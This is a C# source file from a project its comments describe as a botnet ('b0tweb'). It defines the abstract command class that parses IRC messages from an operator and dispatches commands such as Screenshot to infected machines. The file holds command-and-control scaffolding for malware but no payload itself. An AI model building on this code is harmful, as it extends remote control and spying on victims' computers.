using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace b0tweb.Commands
{
    /// <summary>
    /// Class <c>AbstractCommand</c> implements the basics of the commands implemented
    /// into this botnet. Each command has a single function that will execute. For example
    /// <c>Screenshot</c> will handle the screenshot functionality.
    /// </summary>
    abstract class AbstractCommand
    {
        /// <summary>
        /// Name of the command. For example <c>Screenshot</c>.
        /// </summary>
        abstract public string Command { get; }

        /// <summary>
        /// Execute the command given the IRC message
        /// </summary>
        /// <param name="message">The message received via IRC.</param>
        /// <returns></returns>
        public void Execute(string message) {
            string[] splitMessage = message.Split(' ');
            string[] commandArgs = new string[splitMessage.Length - 2];

            // first two strings in the message are assumed to be the bot name and the command name respectively
            Array.Copy(splitMessage, 2, commandArgs, 0, commandArgs.Length);

            this.ExecuteCommand(commandArgs);
        }

        /// <summary>
        /// Execute the command given the arguments as an array
        /// </summary>
        /// <param name="args">arguments that are passed on to the command</param>
        /// <returns></returns>
        abstract protected void ExecuteCommand(string[] args);
        
        /// <summary>
        /// Check if the command matches the requested action from the IRC message.
        /// </summary>
        /// <param name="message">The message received via IRC.</param>
        /// <returns>If the command matches the requested action from the IRC message.</returns>
        public bool Matches(string message)
        {
            return message.IndexOf(this.Command) != -1;
        }
    }
}
